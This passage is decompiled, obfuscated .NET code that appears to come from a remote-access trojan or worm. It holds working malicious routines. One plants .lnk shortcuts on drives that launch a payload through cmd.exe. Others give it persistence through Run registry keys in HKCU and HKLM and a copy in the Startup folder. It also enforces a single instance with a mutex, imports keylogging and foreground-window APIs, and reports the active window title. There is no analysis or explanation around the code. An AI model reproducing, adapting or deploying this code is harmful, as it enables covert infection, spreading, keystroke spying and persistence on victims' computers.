			ProjectData.ClearProjectError();
		}
		object obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { driveInfo_0.Name + new FileInfo(string_1).get_Name() + ".lnk" }, (string[])null, (Type[])null, (bool[])null);
		NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + class2_0.string_0.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(string_1).get_Name() + "\" & exit" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { string_0 }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		obj = null;
		object result = default(object);
		return result;
	}

	static void smethod_68(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class24.smethod_144(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static void smethod_69(object[] object_0, Exception exception_0)
	{
		if (exception_0 == null || !(exception_0 is SecurityException) || !(Class36.string_0 == "1") || !Class24.smethod_191().method_2((SecurityException)exception_0))
		{
			Class24.smethod_144(exception_0, object_0);
			Class24.smethod_191().method_3(exception_0, bool_1: false, bool_2: false);
		}
	}

	static void smethod_70(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class24.smethod_144(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static object smethod_71(Class32 class32_0)
	{
		return class32_0.object_0;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetForegroundWindow", ExactSpelling = true, SetLastError = true)]
	static extern IntPtr GetForegroundWindow_1();

	static string smethod_72()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class24.smethod_139());
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class24.smethod_153());
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_73(Class28 class28_0, Exception exception_0)
	{
		using (new Class40(class28_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class28_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class28_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class28_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class28_0.xmlWriter_0.WriteAttributeString("Method", text);
				class28_0.method_1(new Class32(exception_0, bool_1: true));
			}
			catch
			{
			}
		}
	}

	static bool smethod_74(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_1;
	}

	static void smethod_75(Class13.Class19 class19_0)
	{
		class19_0.int_0 |= 12;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextLengthA(long long_0);

	unsafe static bool smethod_76(Class13.Class18 class18_0, Class13.Class15 class15_0)
	{
		void* ptr = stackalloc byte[9];
		while (true)
		{
			switch (class18_0.int_2)
			{
			default:
				continue;
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class13.Class18.int_1[class18_0.int_7];
				int num = Class24.smethod_125(class15_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class24.smethod_145(class15_0, *(int*)((byte*)ptr + 4));
					num += Class13.Class18.int_0[class18_0.int_7];
					while (num-- > 0)
					{
						class18_0.byte_1[class18_0.int_8++] = class18_0.byte_2;
					}
					if (class18_0.int_8 == class18_0.int_6)
					{
						((byte*)ptr)[8] = 1;
						break;
					}
					goto IL_00a6;
				}
				((byte*)ptr)[8] = 0;
				break;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class24.smethod_51(class18_0.class17_0, class15_0)) & -16) == 0)
				{
					class18_0.byte_1[class18_0.int_8++] = (class18_0.byte_2 = (byte)num2);
					if (class18_0.int_8 != class18_0.int_6)
					{
						continue;
					}
					goto IL_02ab;
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class18_0.byte_2 = 0;
					}
					class18_0.int_7 = num2 - 16;
					class18_0.int_2 = 5;
					goto case 5;
				}
				((byte*)ptr)[8] = 0;
				break;
			}
			case 3:
				while (class18_0.int_8 < class18_0.int_5)
				{
					*(int*)ptr = Class24.smethod_125(class15_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class24.smethod_145(class15_0, 3);
						class18_0.byte_0[Class13.Class18.int_9[class18_0.int_8]] = (byte)(*(uint*)ptr);
						class18_0.int_8++;
						continue;
					}
					goto IL_029d;
				}
				class18_0.class17_0 = new Class13.Class17(class18_0.byte_0);
				class18_0.byte_0 = null;
				class18_0.int_8 = 0;
				class18_0.int_2 = 4;
				goto case 4;
			case 2:
				class18_0.int_5 = Class24.smethod_125(class15_0, 4);
				if (class18_0.int_5 >= 0)
				{
					class18_0.int_5 += 4;
					Class24.smethod_145(class15_0, 4);
					class18_0.byte_0 = new byte[19];
					class18_0.int_8 = 0;
					class18_0.int_2 = 3;
					goto case 3;
				}
				((byte*)ptr)[8] = 0;
				break;
			case 1:
				class18_0.int_4 = Class24.smethod_125(class15_0, 5);
				if (class18_0.int_4 >= 0)
				{
					class18_0.int_4++;
					Class24.smethod_145(class15_0, 5);
					class18_0.int_6 = class18_0.int_3 + class18_0.int_4;
					class18_0.byte_1 = new byte[class18_0.int_6];
					class18_0.int_2 = 2;
					goto case 2;
				}
				((byte*)ptr)[8] = 0;
				break;
			case 0:
				{
					class18_0.int_3 = Class24.smethod_125(class15_0, 5);
					if (class18_0.int_3 >= 0)
					{
						class18_0.int_3 += 257;
						Class24.smethod_145(class15_0, 5);
						class18_0.int_2 = 1;
						goto case 1;
					}
					((byte*)ptr)[8] = 0;
					break;
				}
				IL_02ab:
				((byte*)ptr)[8] = 1;
				break;
				IL_029d:
				((byte*)ptr)[8] = 0;
				break;
			}
			break;
			IL_00a6:
			class18_0.int_2 = 4;
		}
		return ((byte*)ptr)[8] != 0;
	}

	static int smethod_77(Class13.Class15 class15_0)
	{
		return class15_0.int_2;
	}

	static void smethod_78(Class27 class27_0, Enum0 enum0_0, string string_0, string string_1)
	{
		class27_0.delegate2_0?.Invoke(class27_0, new EventArgs3(enum0_0, string_0, string_1));
	}

	unsafe static void smethod_79(Class13.Class20.Class21 class21_0, Class13.Class20.Class21 class21_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class21_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class21_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class24.smethod_46(class21_0, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class21_1.int_1 && *(int*)((byte*)ptr + 8) == class21_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class24.smethod_46(class21_0, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class24.smethod_46(class21_0, 16);
				Class24.smethod_188(class21_1.class20_0.class23_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class24.smethod_46(class21_0, 17);
				Class24.smethod_188(class21_1.class20_0.class23_0, num - 3, 3);
			}
			else
			{
				Class24.smethod_46(class21_0, 18);
				Class24.smethod_188(class21_1.class20_0.class23_0, num - 11, 7);
			}
		}
	}

	[DllImport("user32.dll")]
	static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	unsafe static byte[] smethod_80(byte[] byte_0, byte[] byte_1, byte[] byte_2, int int_0)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class13.Stream0 stream = new Class13.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class13.Class19 class19_2 = new Class13.Class19();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = byte_1.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ byte_1[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class24.smethod_26(stream, 67324752);
				Class24.smethod_148(stream, 20);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 8);
				Class24.smethod_26(stream, (int)(*(long*)ptr));
				Class24.smethod_26(stream, (int)num);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class24.smethod_26(stream, 0);
				Class24.smethod_26(stream, byte_1.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class24.smethod_148(stream, bytes.Length);
				Class24.smethod_148(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class24.smethod_5(class19_2, byte_1);
				while (!Class24.smethod_133(class19_2))
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class24.smethod_8(class19_2, array9);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				Class24.smethod_75(class19_2);
				while (!Class24.smethod_186(class19_2))
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class24.smethod_8(class19_2, array10);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = Class24.smethod_179(class19_2);
				Class24.smethod_26(stream, 33639248);
				Class24.smethod_148(stream, 20);
				Class24.smethod_148(stream, 20);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 8);
				Class24.smethod_26(stream, (int)(*(long*)ptr));
				Class24.smethod_26(stream, (int)num);
				Class24.smethod_26(stream, (int)(*(long*)((byte*)ptr + 16)));
				Class24.smethod_26(stream, byte_1.Length);
				Class24.smethod_148(stream, bytes.Length);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 0);
				Class24.smethod_26(stream, 0);
				Class24.smethod_26(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class24.smethod_26(stream, 101010256);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 0);
				Class24.smethod_148(stream, 1);
				Class24.smethod_148(stream, 1);
				Class24.smethod_26(stream, 46 + bytes.Length);
				Class24.smethod_26(stream, (int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)));
				Class24.smethod_148(stream, 0);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class24.smethod_26(stream, (int)(*(long*)((byte*)ptr + 16)));
				break;
			}
			case 1:
				Class24.smethod_26(stream, 25000571);
				Class24.smethod_26(stream, byte_1.Length);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < byte_1.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, byte_1.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(byte_1, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class24.smethod_26(stream, 0);
					Class24.smethod_26(stream, array5.Length);
					Class13.Class19 class19_ = new Class13.Class19();
					Class24.smethod_5(class19_, array5);
					while (!Class24.smethod_133(class19_))
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class24.smethod_8(class19_, array6);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					Class24.smethod_75(class19_);
					while (!Class24.smethod_186(class19_))
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class24.smethod_8(class19_, array7);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class24.smethod_26(stream, (int)Class24.smethod_179(class19_));
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
				Class24.smethod_26(stream, 41777787);
				byte[] array3 = Class24.smethod_80((byte[])null, byte_1, (byte[])null, 1);
				using (Class12 class12_ = new Class12())
				{
					using ICryptoTransform cryptoTransform2 = Class24.smethod_89(bool_0: false, byte_2, class12_, byte_0);
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class24.smethod_26(stream, 58555003);
				byte[] array = Class24.smethod_80((byte[])null, byte_1, (byte[])null, 1);
				using (Class11 class11_ = new Class11())
				{
					using ICryptoTransform cryptoTransform = Class24.smethod_66(byte_0, class11_, bool_0: false, byte_2);
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class13.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static bool smethod_81(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_0;
	}

	static Assembly smethod_82()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static bool smethod_83(Class13.Class23 class23_0)
	{
		return class23_0.int_1 == 0;
	}

	static void smethod_84(Class13.Class22 class22_0)
	{
		if (class22_0.int_4 >= 65274)
		{
			Class24.smethod_34(class22_0);
		}
		while (class22_0.int_5 < 262 && class22_0.int_7 < class22_0.int_8)
		{
			int num = 65536 - class22_0.int_5 - class22_0.int_4;
			if (num > class22_0.int_8 - class22_0.int_7)
			{
				num = class22_0.int_8 - class22_0.int_7;
			}
			Array.Copy(class22_0.byte_1, class22_0.int_7, class22_0.byte_0, class22_0.int_4 + class22_0.int_5, num);
			class22_0.int_7 += num;
			class22_0.int_6 += num;
			class22_0.int_5 += num;
		}
		if (class22_0.int_5 >= 3)
		{
			Class24.smethod_0(class22_0);
		}
	}

	static void smethod_85(Control0 control0_0, string string_0)
	{
		control0_0.string_0 = string_0;
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = (Image)(object)Class24.smethod_116((string_0.Length > 0) ? "error" : "ok");
		control0_0.bool_1 = true;
		control0_0.bool_0 = true;
		if (string_0.Length > 0)
		{
			((Control)control0_0).set_Height(100);
		}
		((Control)control0_0).Refresh();
	}

	static void smethod_86(Class27 class27_0, Enum0 enum0_0)
	{
		Class24.smethod_142(class27_0, enum0_0, string.Empty);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern short GetAsyncKeyState(int int_0);

	[DllImport("user32.dll")]
	static extern int GetSystemMetrics(int int_0);

	unsafe static void smethod_87(Class0 class0_0)
	{
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		void* ptr = stackalloc byte[12];
		class0_0.string_2 = class0_0.string_5;
		if (Interaction.Command() != null && Interaction.Command().Length > 0)
		{
			string[] array = Strings.Split(Interaction.Command(), new string(new char[1] { ':' }), -1, (CompareMethod)0);
			string text = array[0];
			if (Operators.CompareString(text, new string(new char[2] { 'U', 'P' }), false) == 0)
			{
				try
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SetValue", new object[2] { "di", "!" }, (string[])null, (Type[])null, (bool[])null, true);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
				try
				{
					object processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
					NewLateBinding.LateCall(processById, (Type)null, "WaitForExit", new object[1] { 5000 }, (string[])null, (Type[])null, (bool[])null, true);
					try
					{
						NewLateBinding.LateCall(processById, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					Thread.Sleep(5000);
					ProjectData.ClearProjectError();
				}
			}
			else if (Operators.CompareString(text, new string(new char[2] { '.', '.' }), false) == 0)
			{
				Thread.Sleep(5000);
			}
		}
		Class24.smethod_181(class0_0);
		try
		{
			Process[] processes = Process.GetProcesses();
			*(int*)((byte*)ptr + 8) = 0;
			while (*(int*)((byte*)ptr + 8) < processes.Length)
			{
				Process process = processes[*(int*)((byte*)ptr + 8)];
				try
				{
					FileInfo fileInfo_ = new FileInfo(process.MainModule!.FileName);
					FileInfo fileInfo_2 = (FileInfo)class0_0.object_0;
					if (Class24.smethod_10(fileInfo_2, fileInfo_, class0_0) && process.Id > Process.GetCurrentProcess().Id)
					{
						ProjectData.EndApp();
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					ProjectData.ClearProjectError();
				}
				checked
				{
					(*unchecked((int*)((byte*)ptr + 8)))++;
				}
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			Mutex.OpenExisting(class0_0.string_2);
			ProjectData.EndApp();
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		try
		{
			class0_0.mutex_0 = new Mutex(initiallyOwned: true, class0_0.string_2);
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13);
			Exception ex14 = ex13;
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		object obj = new Thread(class0_0.method_1, 1);
		NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		if (class0_0.bool_0)
		{
			class0_0.class2_0.string_0 = class0_0.string_5 + new string(new char[4] { '.', 'e', 'x', 'e' });
			Class24.smethod_169(class0_0.class2_0);
		}
		try
		{
			class0_0.class1_0 = new Class1();
			obj = new Thread(class0_0.class1_0.method_1, 1);
			NewLateBinding.LateCall(obj, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception ex15)
		{
			ProjectData.SetProjectError(ex15);
			Exception ex16 = ex15;
			ProjectData.ClearProjectError();
		}
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		string text2 = "";
		if (class0_0.bool_1)
		{
			try
			{
				SystemEvents.add_SessionEnding(new SessionEndingEventHandler(class0_0.method_2));
				Class24.smethod_15(class0_0, 1);
			}
			catch (Exception ex17)
			{
				ProjectData.SetProjectError(ex17);
				Exception ex18 = ex17;
				ProjectData.ClearProjectError();
			}
		}
		while (true)
		{
			Thread.Sleep(1000);
			try
			{
				checked
				{
					(*unchecked((int*)ptr))++;
					(*unchecked((int*)((byte*)ptr + 4)))++;
				}
				if (*(int*)ptr == 5)
				{
					try
					{
						Class24.EmptyWorkingSet((long)Process.GetCurrentProcess().Handle);
					}
					catch (Exception ex19)
					{
						ProjectData.SetProjectError(ex19);
						Exception ex20 = ex19;
						ProjectData.ClearProjectError();
					}
				}
				if (*(int*)ptr > 10)
				{
					*(int*)ptr = 0;
					if (class0_0.bool_2 && Operators.CompareString(Class24.smethod_94(class0_0), text2, false) != 0)
					{
						text2 = Class24.smethod_94(class0_0);
						if (text2 != null && text2.Length > 0)
						{
							Class24.smethod_102(class0_0, new string(new char[3] { 'a', 'c', 't' }) + class0_0.string_8 + text2);
						}
					}
				}
				if (*(int*)((byte*)ptr + 4) <= 7)
				{
					continue;
				}
				*(int*)((byte*)ptr + 4) = 0;
				try
				{
					object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
					object[] array2 = new object[2] { class0_0.string_10, true };
					object[] array3 = array2;
					bool[] array4 = new bool[2] { true, false };
					object obj3 = NewLateBinding.LateGet(obj2, (Type)null, "OpenSubKey", array3, (string[])null, (Type[])null, array4);
					if (array4[0])
					{
						class0_0.string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
					}
					object[] array5 = new object[2]
					{
						class0_0.string_5,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
					};
					object[] array6 = array5;
					bool[] array7 = new bool[2] { true, false };
					NewLateBinding.LateCall(obj3, (Type)null, "SetValue", array6, (string[])null, (Type[])null, array7, true);
					if (array7[0])
					{
						class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
					}
				}
				catch (Exception ex21)
				{
					ProjectData.SetProjectError(ex21);
					Exception ex22 = ex21;
					ProjectData.ClearProjectError();
				}
				try
				{
					object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
					object[] array8 = new object[2] { class0_0.string_10, true };
					object[] array9 = array8;
					bool[] array7 = new bool[2] { true, false };
					object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "OpenSubKey", array9, (string[])null, (Type[])null, array7);
					if (array7[0])
					{
						class0_0.string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array8[0]), typeof(string));
					}
					object[] array10 = new object[2]
					{
						class0_0.string_5,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
					};
					object[] array11 = array10;
					bool[] array4 = new bool[2] { true, false };
					NewLateBinding.LateCall(obj5, (Type)null, "SetValue", array11, (string[])null, (Type[])null, array4, true);
					if (array4[0])
					{
						class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array10[0]), typeof(string));
					}
				}
				catch (Exception ex23)
				{
					ProjectData.SetProjectError(ex23);
					Exception ex24 = ex23;
					ProjectData.ClearProjectError();
				}
				try
				{
					File.Copy(Conversions.ToString(NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + class0_0.string_5 + ".exe", overwrite: true);
				}
				catch (Exception ex25)
				{
					ProjectData.SetProjectError(ex25);
					Exception ex26 = ex25;
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex27)
			{
				ProjectData.SetProjectError(ex27);
				Exception ex28 = ex27;
				ProjectData.ClearProjectError();
			}
		}
	}

	unsafe static bool smethod_88(Assembly assembly_0, Assembly assembly_1)
	{
		void* ptr = stackalloc byte[5];
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			((byte*)ptr)[4] = 0;
		}
		else
		{
			if (publicKey2 != null)
			{
				*(int*)ptr = 0;
				while (*(int*)ptr < publicKey2.Length)
				{
					if (publicKey2[*(int*)ptr] != publicKey[*(int*)ptr])
					{
						goto IL_0051;
					}
					(*(int*)ptr)++;
				}
			}
			((byte*)ptr)[4] = 1;
		}
		goto IL_005f;
		IL_0051:
		((byte*)ptr)[4] = 0;
		goto IL_005f;
		IL_005f:
		return ((byte*)ptr)[4] != 0;
	}

	static ICryptoTransform smethod_89(bool bool_0, byte[] byte_0, Class12 class12_0, byte[] byte_1)
	{
		class12_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class12_0.object_0, new object[1] { byte_0 });
		class12_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class12_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class12_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class12_0.object_0, new object[0]);
	}

